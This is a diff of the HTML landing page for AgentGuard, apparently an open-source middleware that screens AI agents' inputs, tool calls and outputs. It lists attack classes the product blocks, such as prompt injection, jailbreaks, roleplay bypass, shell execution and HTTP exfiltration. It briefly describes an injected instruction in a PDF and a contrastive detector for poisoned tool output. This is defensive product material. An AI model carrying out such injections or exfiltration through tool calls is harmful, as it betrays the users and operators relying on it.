@@ -3,992 +3,452 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AgentGuard — Security Middleware for AI Agents</title>
-  <link rel="icon" type="image/svg+xml" href="/favicon.svg" />
+  <title>AgentGuard — Stop your AI agents before they do something they can't undo</title>
+  <meta name="description" content="AgentGuard is a drop-in security middleware that intercepts every action your AI agents take — before it executes. One decorator. Full OWASP Agentic Top 10 coverage." />
+  <meta property="og:title" content="AgentGuard — Security middleware for AI agents" />
+  <meta property="og:description" content="Validate every input, tool call, and output before it executes. One decorator. Open source." />
+  <meta property="og:image" content="assets/dashboard.png" />
+  <link rel="icon" type="image/png" href="assets/logo.png" />
   <link rel="preconnect" href="https://fonts.googleapis.com" />
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link href="https://fonts.googleapis.com/css2?family=Bebas+Neue&family=Manrope:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet" />
-
-  <style>
-    /* =========================================================
-       DESIGN TOKENS
-    ========================================================= */
-    :root {
-      --black:    #0a0a0a;
-      --black2:   #111111;
-      --black3:   #1a1a1a;
-      --black4:   #242424;
-      --border:   #2a2a2a;
-      --border2:  #333333;
-      --text:     #e8e8e8;
-      --muted:    #777777;
-      --orange:   #e8400c;
-      --orange2:  #ff5a2b;
-      --red:      #e83c3c;
-      --green:    #2ecc71;
-      --green2:   #27ae60;
-      --blue:     #3498db;
-      --purple:   #9b59b6;
-      --mono:     'JetBrains Mono', monospace;
-      --sans:     'Manrope', sans-serif;
-      --display:  'Bebas Neue', sans-serif;
-      --radius:   4px;
-      --nav-h:    64px;
-    }
-
-    /* =========================================================
-       RESET + BASE
-    ========================================================= */
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    html { scroll-behavior: smooth; }
-    body {
-      background: var(--black);
-      color: var(--text);
-      font-family: var(--sans);
-      font-size: 14px;
-      line-height: 1.6;
-      min-height: 100vh;
-      overflow-x: hidden;
-    }
-
-    /* grain overlay */
-    body::after {
-      content: '';
-      position: fixed;
-      inset: 0;
-      pointer-events: none;
-      z-index: 9999;
-      background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23noise)' opacity='0.04'/%3E%3C/svg%3E");
-      opacity: 0.4;
-    }
-
-    a { color: inherit; text-decoration: none; }
-
-    /* =========================================================
-       SCROLLBAR
-    ========================================================= */
-    ::-webkit-scrollbar { width: 6px; height: 6px; }
-    ::-webkit-scrollbar-track { background: var(--black2); }
-    ::-webkit-scrollbar-thumb { background: var(--border2); border-radius: 3px; }
-
-    /* =========================================================
-       KEYFRAMES
-    ========================================================= */
-    @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50%       { opacity: 0.4; transform: scale(0.8); }
-    }
-
-    @keyframes fadeUp {
-      from { opacity: 0; transform: translateY(16px); }
-      to   { opacity: 1; transform: translateY(0); }
-    }
-
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to   { opacity: 1; }
-    }
-
-    /* =========================================================
-       NAVBAR
-    ========================================================= */
-    .navbar {
-      position: fixed;
-      top: 0; left: 0; right: 0;
-      height: var(--nav-h);
-      background: rgba(10,10,10,0.92);
-      backdrop-filter: blur(16px);
-      -webkit-backdrop-filter: blur(16px);
-      border-bottom: 1px solid var(--border);
-      z-index: 100;
-      display: flex;
-      align-items: center;
-      padding: 0 24px;
-      gap: 24px;
-    }
-
-    .nav-logo {
-      font-family: var(--mono);
-      font-size: 15px;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      color: var(--text);
-      white-space: nowrap;
-    }
-    .nav-logo span { color: var(--orange); }
-
-    .nav-spacer { flex: 1; }
-
-    .nav-link {
-      font-family: var(--mono);
-      font-size: 11px;
-      font-weight: 700;
-      letter-spacing: 0.12em;
-      color: var(--muted);
-      text-transform: uppercase;
-      padding: 4px 0;
-      border-bottom: 2px solid transparent;
-      transition: color 0.15s, border-color 0.15s;
-    }
-    .nav-link:hover { color: var(--text); }
-    .nav-link.active { color: var(--orange); border-bottom-color: var(--orange); }
-
-    /* =========================================================
-       EYEBROW
-    ========================================================= */
-    .eyebrow {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      font-family: var(--mono);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.2em;
-      color: var(--muted);
-      text-transform: uppercase;
-      margin-bottom: 16px;
-    }
-    .eyebrow::before {
-      content: '';
-      display: inline-block;
-      width: 24px; height: 1px;
-      background: var(--orange);
-      flex-shrink: 0;
-    }
-
-    /* =========================================================
-       HERO
-    ========================================================= */
-    .hero {
-      position: relative;
-      min-height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      text-align: center;
-      padding: calc(var(--nav-h) + 48px) 24px 96px;
-      overflow: hidden;
-    }
-
-    .hero::before {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: radial-gradient(ellipse 800px 400px at 50% 60%, rgba(232,64,12,0.06), transparent);
-      pointer-events: none;
-    }
-
-    .hero-inner {
-      position: relative;
-      max-width: 900px;
-      animation: fadeUp 0.7s ease both;
-    }
-
-    .hero-eyebrow {
-      font-family: var(--mono);
-      font-size: 11px;
-      letter-spacing: 0.25em;
-      color: var(--muted);
-      margin-bottom: 28px;
-      text-transform: uppercase;
-    }
-
-    .hero-title {
-      font-family: var(--display);
-      font-size: clamp(64px, 10vw, 112px);
-      line-height: 0.95;
-      letter-spacing: 0.02em;
-      color: var(--text);
-      margin-bottom: 24px;
-    }
-
-    .hero-title .orange { color: var(--orange); }
-
-    .hero-sub {
-      font-family: var(--sans);
-      font-size: 18px;
-      color: var(--muted);
-      max-width: 600px;
-      margin: 0 auto 48px;
-      line-height: 1.7;
-    }
-
-    .hero-ctas {
-      display: flex;
-      gap: 16px;
-      justify-content: center;
-      flex-wrap: wrap;
-    }
-
-    .btn-primary {
-      font-family: var(--display);
-      font-size: 18px;
-      letter-spacing: 0.08em;
-      color: #fff;
-      background: var(--orange);
-      border: none;
-      padding: 14px 32px;
-      border-radius: var(--radius);
-      cursor: pointer;
-      text-decoration: none;
-      display: inline-block;
-      transition: background 0.2s, transform 0.15s;
-    }
-    .btn-primary:hover { background: var(--orange2); transform: translateY(-1px); }
-
-    .btn-ghost {
-      font-family: var(--display);
-      font-size: 18px;
-      letter-spacing: 0.08em;
-      color: var(--text);
-      background: transparent;
-      border: 1px solid var(--border);
-      padding: 14px 32px;
-      border-radius: var(--radius);
-      cursor: pointer;
-      text-decoration: none;
-      display: inline-block;
-      transition: border-color 0.2s, color 0.2s, transform 0.15s;
-    }
-    .btn-ghost:hover { border-color: var(--orange); color: var(--orange); transform: translateY(-1px); }
-
-    /* =========================================================
-       SECTION WRAPPER
-    ========================================================= */
-    .section {
-      padding: 80px 24px;
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-
-    .section-full {
-      padding: 80px 24px;
-      border-top: 1px solid var(--border);
-    }
-
-    .section-inner {
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-
-    /* =========================================================
-       STATS STRIP
-    ========================================================= */
-    .stats-wrap {
-      border-top: 1px solid var(--border);
-      border-bottom: 1px solid var(--border);
-      background: var(--black2);
-    }
-
-    .stats-strip {
-      display: grid;
-      grid-template-columns: repeat(4, 1fr);
-      gap: 1px;
-      background: var(--border);
-      border-left: 1px solid var(--border);
-      border-right: 1px solid var(--border);
-      max-width: 1200px;
-      margin: 0 auto;
-    }
-
-    .stat-card {
-      background: var(--black2);
-      padding: 32px 28px;
-      transition: background 0.2s ease;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .stat-card::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0;
-      height: 2px;
-      background: transparent;
-      transition: background 0.2s ease;
-    }
-
-    .stat-card:hover::before { background: var(--orange); }
-    .stat-card:hover { background: var(--black3); }
-
-    .stat-label {
-      font-family: var(--mono);
-      font-size: 9px;
-      font-weight: 700;
-      letter-spacing: 0.2em;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 10px;
-    }
-
-    .stat-value {
-      font-family: var(--display);
-      font-size: 48px;
-      line-height: 1;
-      letter-spacing: 0.02em;
-    }
-    .stat-value.white  { color: var(--text); }
-    .stat-value.red    { color: var(--red); }
-    .stat-value.green  { color: var(--green); }
-    .stat-value.orange { color: var(--orange); }
-
-    .stat-sub {
-      font-family: var(--mono);
-      font-size: 10px;
-      color: var(--muted);
-      margin-top: 6px;
-    }
-
-    /* =========================================================
-       HOW IT WORKS
-    ========================================================= */
-    .steps-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 1px;
-      background: var(--border);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-    }
-
-    .step-card {
-      background: var(--black2);
-      padding: 36px 28px;
-      border-left: 3px solid transparent;
-      transition: border-color 0.2s, background 0.2s;
-      position: relative;
-    }
-    .step-card:first-child { border-left-color: transparent; }
-    .step-card:hover { border-left-color: var(--orange); background: var(--black3); }
-
-    .step-number {
-      font-family: var(--display);
-      font-size: 48px;
-      color: var(--orange);
-      line-height: 1;
-      margin-bottom: 12px;
-    }
-
-    .step-title {
-      font-family: var(--display);
-      font-size: 22px;
-      letter-spacing: 0.04em;
-      color: var(--text);
-      margin-bottom: 10px;
-    }
-
-    .step-body {
-      font-family: var(--sans);
-      font-size: 13px;
-      color: var(--muted);
-      line-height: 1.7;
-    }
-
-    /* =========================================================
-       CODE BLOCK
-    ========================================================= */
-    .code-section {
-      background: var(--black3);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      overflow: hidden;
-    }
-
-    .code-header {
-      padding: 16px 20px;
-      border-bottom: 1px solid var(--border);
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-    }
-
-    .code-cols {
-      display: grid;
-      grid-template-columns: 1fr 2fr;
-      gap: 1px;
-      background: var(--border);
-    }
-
-    .code-pane {
-      background: var(--black3);
-      padding: 24px;
-      overflow-x: auto;
-    }
-
-    .code-pane-label {
-      font-family: var(--mono);
-      font-size: 9px;
-      font-weight: 700;
-      letter-spacing: 0.2em;
-      text-transform: uppercase;
-      color: var(--muted);
-      margin-bottom: 16px;
-    }
-
-    pre {
-      font-family: var(--mono);
-      font-size: 13px;
-      line-height: 1.7;
-      color: var(--text);
-      white-space: pre;
-      overflow-x: auto;
-    }
-
-    .kw  { color: var(--orange); }
-    .fn  { color: var(--orange2); }
-    .str { color: var(--green); }
-    .cm  { color: var(--muted); font-style: italic; }
-    .py  { color: var(--blue); }
-
-    .copy-btn {
-      font-family: var(--mono);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.15em;
-      text-transform: uppercase;
-      color: var(--muted);
-      background: transparent;
-      border: 1px solid var(--border);
-      padding: 5px 12px;
-      border-radius: var(--radius);
-      cursor: pointer;
-      transition: color 0.15s, border-color 0.15s;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .copy-btn:hover { color: var(--orange); border-color: var(--orange); }
-    .copy-btn.copied { color: var(--green); border-color: var(--green); }
-
-    /* =========================================================
-       DEFENSE LAYERS
-    ========================================================= */
-    .layers-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 16px;
-    }
-
-    .layer-card {
-      background: var(--black2);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 28px;
-      position: relative;
-      overflow: hidden;
-      transition: background 0.2s, border-color 0.2s;
-    }
-
-    .layer-card::before {
-      content: '';
-      position: absolute;
-      top: 0; left: 0; right: 0;
-      height: 2px;
-      background: transparent;
-      transition: background 0.2s;
-    }
-
-    .layer-card:hover::before { background: var(--orange); }
-    .layer-card:hover { background: var(--black3); border-color: var(--border2); }
-
-    .layer-card-header {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      margin-bottom: 16px;
-    }
-
-    .layer-badge {
-      font-family: var(--mono);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.12em;
-      padding: 3px 8px;
-      border-radius: 2px;
-      text-transform: uppercase;
-      white-space: nowrap;
-    }
-
-    .badge-l1     { background: rgba(52,152,219,0.15);  color: var(--blue);   border: 1px solid rgba(52,152,219,0.3); }
-    .badge-l2     { background: rgba(155,89,182,0.15);  color: var(--purple); border: 1px solid rgba(155,89,182,0.3); }
-    .badge-c2     { background: rgba(232,64,12,0.15);   color: var(--orange); border: 1px solid rgba(232,64,12,0.3); }
-    .badge-c3     { background: rgba(232,60,60,0.15);   color: var(--red);    border: 1px solid rgba(232,60,60,0.3); }
-    .badge-c4     { background: rgba(46,204,113,0.15);  color: var(--green);  border: 1px solid rgba(46,204,113,0.3); }
-
-    .layer-card-title {
-      font-family: var(--display);
-      font-size: 20px;
-      letter-spacing: 0.04em;
-      color: var(--text);
-    }
-
-    .layer-card-divider {
-      height: 1px;
-      background: var(--border);
-      margin-bottom: 14px;
-    }
-
-    .layer-card-body {
-      font-family: var(--sans);
-      font-size: 13px;
-      color: var(--muted);
-      line-height: 1.7;
-    }
-
-    /* =========================================================
-       ATTACK COVERAGE
-    ========================================================= */
-    .attack-grid {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-    }
-
-    .attack-pill {
-      font-family: var(--mono);
-      font-size: 10px;
-      font-weight: 500;
-      letter-spacing: 0.12em;
-      text-transform: uppercase;
-      padding: 6px 14px;
-      border: 1px solid var(--border);
-      border-radius: 20px;
-      background: var(--black2);
-      color: var(--muted);
-      cursor: default;
-      transition: border-color 0.15s, color 0.15s;
-    }
-    .attack-pill:hover { border-color: var(--orange); color: var(--orange); }
-
-    /* =========================================================
-       DEMO CTA
-    ========================================================= */
-    .demo-cta {
-      text-align: center;
-      padding: 80px 32px;
-      background: var(--black2);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-    }
-
-    .demo-cta-title {
-      font-family: var(--display);
-      font-size: clamp(40px, 6vw, 64px);
-      letter-spacing: 0.04em;
-      color: var(--text);
-      margin-bottom: 16px;
-    }
-
-    .demo-cta-sub {
-      font-family: var(--sans);
-      font-size: 16px;
-      color: var(--muted);
-      margin-bottom: 40px;
-      max-width: 500px;
-      margin-left: auto;
-      margin-right: auto;
-      margin-bottom: 40px;
-    }
-
-    /* =========================================================
-       FOOTER
-    ========================================================= */
-    .footer {
-      border-top: 1px solid var(--border);
-      padding: 40px 24px;
-    }
-
-    .footer-inner {
-      max-width: 1200px;
-      margin: 0 auto;
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-start;
-      gap: 32px;
-    }
-
-    .footer-logo {
-      font-family: var(--mono);
-      font-size: 14px;
-      font-weight: 700;
-      letter-spacing: 0.08em;
-      color: var(--text);
-      margin-bottom: 8px;
-    }
-    .footer-logo span { color: var(--orange); }
-
-    .footer-tagline {
-      font-family: var(--sans);
-      font-size: 12px;
-      color: var(--muted);
-      line-height: 1.6;
-      max-width: 240px;
-    }
-
-    .footer-nav {
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-      align-items: flex-end;
-    }
-
-    .footer-links {
-      display: flex;
-      gap: 24px;
-    }
-
-    .footer-link {
-      font-family: var(--mono);
-      font-size: 10px;
-      font-weight: 700;
-      letter-spacing: 0.15em;
-      text-transform: uppercase;
-      color: var(--muted);
-      transition: color 0.15s;
-    }
-    .footer-link:hover { color: var(--text); }
-
-    .footer-credit {
-      font-family: var(--mono);
-      font-size: 10px;
-      color: var(--muted);
-      letter-spacing: 0.08em;
-      margin-top: 8px;
-    }
-
-    /* =========================================================
-       PANEL (shared)
-    ========================================================= */
-    .panel {
-      background: var(--black2);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      overflow: hidden;
-    }
-
-    /* =========================================================
-       RESPONSIVE
-    ========================================================= */
-    @media (max-width: 768px) {
-      .stats-strip { grid-template-columns: repeat(2, 1fr); }
-      .steps-grid  { grid-template-columns: 1fr; }
-      .code-cols   { grid-template-columns: 1fr; }
-      .layers-grid { grid-template-columns: 1fr; }
-      .footer-inner { flex-direction: column; }
-      .footer-nav { align-items: flex-start; }
-      .hero-title { font-size: clamp(48px, 14vw, 80px); }
-    }
-  </style>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Space+Grotesk:wght@500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
 
-<!-- =========================================================
-     NAVBAR
-========================================================= -->
-<nav class="navbar">
-  <div class="nav-logo">
-    <span>⌐◨</span> AGENTGUARD <span>◨¬</span>
-  </div>
-
-  <a href="/" class="nav-link active">HOME</a>
-  <a href="/dashboard" class="nav-link">DASHBOARD</a>
-  <a href="/demo" class="nav-link">DEMO</a>
-
-  <div class="nav-spacer"></div>
-</nav>
-
-<!-- =========================================================
-     HERO
-========================================================= -->
-<section class="hero">
-  <div class="hero-inner">
-    <div class="hero-eyebrow">— AGENTGUARD v1 —</div>
-    <h1 class="hero-title">
-      YOUR AGENT'S<br>
-      <span class="orange">LAST LINE OF DEFENSE</span>
-    </h1>
-    <p class="hero-sub">
-      Battle-tested against OWASP Agentic AI Top 10. Guards every input, output,
-      and tool call in real time. 97.5% attack block rate.
-    </p>
-    <div class="hero-ctas">
-      <a href="/demo" class="btn-primary">TRY THE DEMO →</a>
-      <a href="/dashboard" class="btn-ghost">VIEW DASHBOARD →</a>
+  <!-- ============================================================ NAV -->
+  <header class="nav">
+    <div class="nav-inner">
+      <a href="#top" class="nav-brand">
+        <img src="assets/logo.png" alt="AgentGuard" />
+        <span>AgentGuard</span>
+      </a>
+      <nav class="nav-links">
+        <a href="#why">Why</a>
+        <a href="#platform">Platform</a>
+        <a href="#owasp">Coverage</a>
+        <a href="#team">Team</a>
+        <a href="https://github.com/wildcraft958/AgentGuard_NamoFans" target="_blank" rel="noopener">GitHub</a>
+      </nav>
+      <a class="btn btn-primary nav-cta" href="/demo" target="_blank" rel="noopener">Try the live demo →</a>
     </div>
-  </div>
-</section>
+  </header>
 
-<!-- =========================================================
-     STATS STRIP
-========================================================= -->
-<div class="stats-wrap">
-  <div class="stats-strip">
-    <div class="stat-card">
-      <div class="stat-label">Security Rate</div>
-      <div class="stat-value green" id="stat-security">0%</div>
-      <div class="stat-sub">of attacks blocked</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Attacks Blocked</div>
-      <div class="stat-value red" id="stat-blocked">0/40</div>
-      <div class="stat-sub">in benchmark suite</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Defense Layers</div>
-      <div class="stat-value orange" id="stat-layers">0</div>
-      <div class="stat-sub">L1 · L2 · C2 · C3 · C4</div>
-    </div>
-    <div class="stat-card">
-      <div class="stat-label">Avg Latency</div>
-      <div class="stat-value white" id="stat-latency">&lt;500ms</div>
-      <div class="stat-sub">per guard check</div>
-    </div>
-  </div>
-</div>
-
-<!-- =========================================================
-     HOW IT WORKS
-========================================================= -->
-<div class="section-full">
-  <div class="section-inner">
-    <div class="eyebrow">How It Works</div>
-    <div class="steps-grid">
-      <div class="step-card">
-        <div class="step-number">01</div>
-        <div class="step-title">DECORATE</div>
-        <div class="step-body">Add <code style="font-family:var(--mono);color:var(--orange);font-size:12px;">@guard_agent</code> to your function. Zero rewrites — drop it on existing agents in seconds.</div>
-      </div>
-      <div class="step-card">
-        <div class="step-number">02</div>
-        <div class="step-title">GUARD</div>
-        <div class="step-body">Every prompt, output, and tool call is inspected in real time across 5 independent defense layers before the agent acts.</div>
-      </div>
-      <div class="step-card">
-        <div class="step-number">03</div>
-        <div class="step-title">OBSERVE</div>
-        <div class="step-body">OTel spans stream to Jaeger in real time. Live dashboard shows every decision, block, and latency breakdown.</div>
-      </div>
-    </div>
-  </div>
-</div>
-
-<!-- =========================================================
-     CODE BLOCK
-========================================================= -->
-<div class="section-full">
-  <div class="section-inner">
-    <div class="eyebrow">Install &amp; Protect</div>
-    <div class="code-section">
-      <div class="code-header">
-        <span style="font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:0.12em;text-transform:uppercase;">Drop-in decorator — no rewrites needed</span>
-        <button class="copy-btn" id="copy-btn" onclick="copyCode()">
-          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
-          COPY
-        </button>
-      </div>
-      <div class="code-cols">
-        <div class="code-pane">
-          <div class="code-pane-label">Install</div>
-          <pre><span class="kw">pip</span> install agentguard</pre>
+  <!-- ============================================================ HERO -->
+  <section id="top" class="hero">
+    <div class="hero-inner">
+      <div class="hero-copy">
+        <div class="hero-eyebrow">AI Agent Security · Open Source</div>
+        <h1>Stop your AI agents before they do something they can't undo.</h1>
+        <p class="hero-sub">
+          AgentGuard is a drop-in security middleware that intercepts every action
+          your AI agents take — before it executes. One decorator. Full OWASP
+          Agentic Top 10 coverage. No rearchitecting.
+        </p>
+        <div class="hero-ctas">
+          <a class="btn btn-primary" href="/demo" target="_blank" rel="noopener">Try the live demo →</a>
+          <a class="btn btn-ghost" href="https://github.com/wildcraft958/AgentGuard_NamoFans" target="_blank" rel="noopener">View on GitHub</a>
         </div>
-        <div class="code-pane" id="code-snippet">
-          <div class="code-pane-label">Usage</div>
-          <pre id="code-pre"><span class="kw">from</span> agentguard <span class="kw">import</span> guard_agent
-
-<span class="py">@guard_agent</span>(
-    param=<span class="str">"message"</span>,
-    output_field=<span class="str">"response"</span>,
-    config=<span class="str">"agentguard.yaml"</span>,
-)
-<span class="kw">def</span> <span class="fn">my_agent</span>(message: str) -&gt; dict:
-    response = llm.complete(message)
-    <span class="kw">return</span> {<span class="str">"response"</span>: response}</pre>
+        <div class="hero-meta">Open source · MIT · Python 3.11+</div>
+      </div>
+      <div class="hero-visual">
+        <div class="hero-visual-frame">
+          <img src="assets/dashboard.png" alt="AgentGuard live dashboard with real-time trace stream and per-layer block counts" />
         </div>
       </div>
     </div>
-  </div>
-</div>
+  </section>
 
-<!-- =========================================================
-     DEFENSE LAYERS
-========================================================= -->
-<div class="section-full">
-  <div class="section-inner">
-    <div class="eyebrow">Defense Layers</div>
-    <div class="layers-grid">
-      <div class="layer-card">
-        <div class="layer-card-header">
-          <span class="layer-badge badge-l1">L1</span>
-          <span class="layer-card-title">INPUT SECURITY</span>
-        </div>
-        <div class="layer-card-divider"></div>
-        <div class="layer-card-body">Azure Prompt Shields · Content Filters · Blocklist pattern matching. Blocks malicious prompts before the LLM ever sees them.</div>
+  <!-- ============================================================ STATS -->
+  <section class="stats">
+    <div class="stats-inner">
+      <div class="stat" data-reveal data-reveal-delay="1">
+        <div class="stat-num"><span class="counter" data-target="88">0</span><span>%</span></div>
+        <div class="stat-body">of organisations experienced or suspect an AI agent security incident in the past 12 months.</div>
+        <div class="stat-source">CSO</div>
       </div>
-      <div class="layer-card">
-        <div class="layer-card-header">
-          <span class="layer-badge badge-l2">L2</span>
-          <span class="layer-card-title">OUTPUT SECURITY</span>
-        </div>
-        <div class="layer-card-divider"></div>
-        <div class="layer-card-body">Azure Language PII detection · Hate speech · Self-harm content filters. Scrubs agent responses before they reach the user.</div>
+      <div class="stat" data-reveal data-reveal-delay="2">
+        <div class="stat-num"><span class="counter" data-target="75">0</span><span>%</span></div>
+        <div class="stat-body">of IT leaders cite security as the #1 AI deployment blocker.</div>
+        <div class="stat-source">Gartner, 2025</div>
       </div>
-      <div class="layer-card">
-        <div class="layer-card-header">
-          <span class="layer-badge badge-c2">C2</span>
-          <span class="layer-card-title">MELON DETECTOR</span>
-        </div>
-        <div class="layer-card-divider"></div>
-        <div class="layer-card-body">Contrastive injection detector. Runs a clean vs. poisoned tool output comparison to catch indirect prompt injection mid-loop.</div>
-      </div>
-      <div class="layer-card">
-        <div class="layer-card-header">
-          <span class="layer-badge badge-c3">C3</span>
-          <span class="layer-card-title">TOOL FIREWALL</span>
-        </div>
-        <div class="layer-card-divider"></div>
-        <div class="layer-card-body">Validates every tool call and tool output. Blocks unauthorized shell commands, HTTP exfiltration attempts, and SQL injection.</div>
-      </div>
-      <div class="layer-card">
-        <div class="layer-card-header">
-          <span class="layer-badge badge-c4">C4</span>
-          <span class="layer-card-title">APPROVAL WORKFLOW</span>
-        </div>
-        <div class="layer-card-divider"></div>
-        <div class="layer-card-body">Human-in-the-loop gate for high-risk actions. Holds the agent until an operator approves or rejects the pending operation.</div>
+      <div class="stat" data-reveal data-reveal-delay="3">
+        <div class="stat-num"><span class="counter" data-target="40">0</span><span>%</span></div>
+        <div class="stat-body">of enterprise applications will use AI agents by 2028.</div>
+        <div class="stat-source">Gartner</div>
       </div>
     </div>
-  </div>
-</div>
+  </section>
 
-<!-- =========================================================
-     ATTACK COVERAGE
-========================================================= -->
-<div class="section-full">
-  <div class="section-inner">
-    <div class="eyebrow">What We Stop</div>
-    <div class="attack-grid">
-      <span class="attack-pill">Prompt Injection</span>
-      <span class="attack-pill">Jailbreak</span>
-      <span class="attack-pill">PII Exfiltration</span>
-      <span class="attack-pill">SQL Injection</span>
-      <span class="attack-pill">Shell Execution</span>
-      <span class="attack-pill">HTTP Exfil</span>
-      <span class="attack-pill">Indirect Injection</span>
-      <span class="attack-pill">Social Engineering</span>
-      <span class="attack-pill">System Override</span>
-      <span class="attack-pill">Doc Injection</span>
-      <span class="attack-pill">Hate Speech</span>
-      <span class="attack-pill">Self-Harm Content</span>
-      <span class="attack-pill">Roleplay Bypass</span>
-      <span class="attack-pill">Context Hijacking</span>
-      <span class="attack-pill">Tool Abuse</span>
-      <span class="attack-pill">Data Exfiltration</span>
+  <!-- ============================================================ WHY / GAP -->
+  <section id="why" class="why">
+    <div class="why-inner">
+      <div class="section-eyebrow" data-reveal>Why AgentGuard</div>
+      <h2 class="why-headline" data-reveal data-reveal-delay="1">
+        Your AI agents are already running.
+      </h2>
+      <ul class="why-list" data-reveal data-reveal-delay="2">
+        <li>Reading documents.</li>
+        <li>Writing files.</li>
+        <li>Calling tools.</li>
+        <li>Querying databases.</li>
+      </ul>
+      <p class="why-body" data-reveal data-reveal-delay="3">
+        One injected instruction in a PDF they read,<br />
+        one rogue tool call,<br />
+        one slow privilege escalation across a session —<br />
+        and you're the next CVE.
+      </p>
+      <div class="why-divider" data-reveal data-reveal-delay="3"></div>
+      <p class="why-punchline" data-reveal data-reveal-delay="4">
+        Existing guardrails check what the model <em>says</em>.<br />
+        <strong>Nothing checks what the agent <em>does</em>.</strong>
+      </p>
     </div>
-  </div>
-</div>
+  </section>
 
-<!-- =========================================================
-     DEMO CTA
-========================================================= -->
-<div class="section-full">
-  <div class="section-inner">
-    <div class="demo-cta">
-      <div class="demo-cta-title">TEST IT LIVE</div>
-      <p class="demo-cta-sub">Run real attacks against 4 demo agents. See what gets blocked, what slips through, and how fast it responds.</p>
-      <a href="/demo" class="btn-primary">OPEN DEMO PLAYGROUND →</a>
-    </div>
-  </div>
-</div>
-
-<!-- =========================================================
-     FOOTER
-========================================================= -->
-<footer class="footer">
-  <div class="footer-inner">
-    <div>
-      <div class="footer-logo"><span>⌐◨</span> AGENTGUARD <span>◨¬</span></div>
-      <div class="footer-tagline">Security middleware for Python AI agents.</div>
-    </div>
-    <div class="footer-nav">
-      <div class="footer-links">
-        <a href="/dashboard" class="footer-link">Dashboard</a>
-        <a href="/demo" class="footer-link">Demo</a>
+  <!-- ============================================================ INTRODUCING -->
+  <section class="intro">
+    <div class="intro-inner">
+      <div class="section-eyebrow" data-reveal>Introducing</div>
+      <h2 data-reveal data-reveal-delay="1">A guardian agent that sits between your AI agents and the real world.</h2>
+      <p class="intro-sub" data-reveal data-reveal-delay="2">
+        Every input. Every tool call. Every response. Validated before it
+        executes — without rewriting a line of your agent code.
+      </p>
+      <div class="intro-visual" data-reveal data-reveal-delay="3">
+        <img src="assets/middleware.png" alt="AgentGuard sits as middleware between an AI agent and the outside world" />
       </div>
-      <div class="footer-credit">IIT Kharagpur — NamoFans</div>
     </div>
-  </div>
-</footer>
+  </section>
 
-<script>
-// =========================================================
-//  STAT COUNTER ANIMATION
-// =========================================================
+  <!-- ============================================================ PLATFORM -->
+  <section id="platform" class="platform">
+    <div class="platform-inner">
+      <div class="section-eyebrow" data-reveal>Platform</div>
+      <h2 data-reveal data-reveal-delay="1">Three layers of defense. One decorator to enable them.</h2>
 
-function animateCounter(el, target, suffix, duration) {
-  const start = performance.now();
-  const isFloat = target % 1 !== 0;
+      <div class="pillars">
+        <article class="pillar" data-reveal data-reveal-delay="1">
+          <div class="pillar-num">01</div>
+          <h3>Block bad inputs</h3>
+          <p class="pillar-tag">Stop prompt injection and jailbreaks before they reach your agent.</p>
+          <p class="pillar-body">
+            33 offline patterns catch the obvious attacks in under a millisecond.
+            Enterprise-grade detection catches the rest. Free for the easy cases,
+            cloud-backed for the hard ones.
+          </p>
+        </article>
 
-  function step(now) {
-    const elapsed = now - start;
-    const progress = Math.min(elapsed / duration, 1);
-    // ease-out cubic
-    const eased = 1 - Math.pow(1 - progress, 3);
-    const value = eased * target;
-    el.textContent = isFloat
-      ? value.toFixed(1) + suffix
-      : Math.round(value) + suffix;
-    if (progress < 1) requestAnimationFrame(step);
-    else el.textContent = (isFloat ? target.toFixed(1) : target) + suffix;
-  }
+        <article class="pillar" data-reveal data-reveal-delay="2">
+          <div class="pillar-num">02</div>
+          <h3>Police every tool call</h3>
+          <p class="pillar-tag">Watch what your agent is about to do — and stop it if it shouldn't.</p>
